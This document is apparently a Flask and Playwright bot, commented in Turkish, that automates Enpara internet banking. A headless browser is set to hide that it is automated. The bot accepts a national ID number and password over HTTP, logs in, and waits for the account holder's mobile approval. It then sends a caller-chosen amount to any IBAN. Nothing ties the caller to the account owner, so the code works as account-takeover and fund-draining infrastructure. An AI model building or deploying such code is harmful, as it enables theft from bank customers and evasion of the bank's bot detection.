import os
import time
import asyncio
from flask import Flask, request, jsonify
from playwright.async_api import async_playwright

app = Flask(__name__)

browser = None
page = None
playwright_instance = None

durum = "BEKLIYOR"
mesaj = "Hazır"
logs = []

# 🔥 TEK EVENT LOOP (thread safe)
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def log(m):
    global logs
    m = f"[{time.strftime('%H:%M:%S')}] {m}"
    logs.append(m)
    if len(logs) > 200:
        logs.pop(0)
    print(m, flush=True)

# 🔥 Browser başlat (STEALTH + STABLE)
async def create_browser():
    global browser, page, playwright_instance

    if browser:
        return True

    try:
        log("🌐 Browser başlatılıyor...")

        playwright_instance = await async_playwright().start()

        browser = await playwright_instance.chromium.launch(
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-blink-features=AutomationControlled",
                "--disable-gpu",
                "--no-first-run",
                "--no-zygote",
                "--single-process"
            ]
        )

        context = await browser.new_context(
            viewport={"width": 1280, "height": 800},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36"
        )

        page = await context.new_page()

        log("✅ Browser hazır")
        return True

    except Exception as e:
        log(f"❌ Browser hata: {e}")
        return False


@app.route("/")
def home():
    return "✅ BOT AKTİF"


@app.route("/giris", methods=["POST"])
def giris():
    global durum, mesaj

    data = request.json
    tc = data.get("tc")
    sifre = data.get("sifre")

    log("🚀 Giriş deneniyor...")

    if not tc or not sifre:
        return jsonify({"durum": "HATA", "mesaj": "Eksik bilgi", "logs": logs})

    if browser is None:
        ok = loop.run_until_complete(create_browser())
        if not ok:
            return jsonify({"durum": "HATA", "mesaj": "Browser açılamadı", "logs": logs})

    try:
        loop.run_until_complete(page.goto("https://internetsubesi.enpara.com/Login/LoginPage.aspx", timeout=60000))

        loop.run_until_complete(page.fill("#txtuserid", tc))
        loop.run_until_complete(page.fill("#txtpass", sifre))
        loop.run_until_complete(page.click("#ctl00_MainContent_lbtnNext"))

        durum = "MOBIL_ONAY_BEKLIYOR"
        mesaj = "Mobil onay ver"

        log("📱 Mobil onay bekleniyor")

        return jsonify({"durum": durum, "mesaj": mesaj, "logs": logs})

    except Exception as e:
        log(f"❌ Giriş hata: {e}")
        return jsonify({"durum": "HATA", "mesaj": str(e), "logs": logs})


@app.route("/kontrol")
def kontrol():
    global durum, mesaj

    try:
        url = page.url

        if "Account/AccountSummary" in url:
            if durum != "GIRIS_BASARILI":
                durum = "GIRIS_BASARILI"
                mesaj = "Giriş başarılı"
                log("✅ Login OK")

        return jsonify({"durum": durum, "mesaj": mesaj, "logs": logs})

    except Exception as e:
        return jsonify({"durum": "HATA", "mesaj": str(e), "logs": logs})


@app.route("/transfer", methods=["POST"])
def transfer():
    global durum

    if durum != "GIRIS_BASARILI":
        return jsonify({"durum": "HATA", "mesaj": "Login ol", "logs": logs})

    data = request.json
    iban = data.get("iban")
    tutar = data.get("tutar")

    try:
        loop.run_until_complete(page.goto("https://internetsubesi.enpara.com/Transfer/TransferToAccount.aspx"))

        loop.run_until_complete(page.fill("#txtIban", iban))
        loop.run_until_complete(page.fill("#txtAmount", str(tutar)))

        loop.run_until_complete(page.click("#btnNext"))
        loop.run_until_complete(page.click("#btnConfirm"))

        log("💸 Transfer gönderildi")

        return jsonify({"durum": "BASARILI", "mesaj": "Transfer OK", "logs": logs})

    except Exception as e:
        log(f"❌ Transfer hata: {e}")
        return jsonify({"durum": "HATA", "mesaj": str(e), "logs": logs})


# 🔥 HEALTH CHECK (Render için önemli)
@app.route("/health")
def health():
    return "OK"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
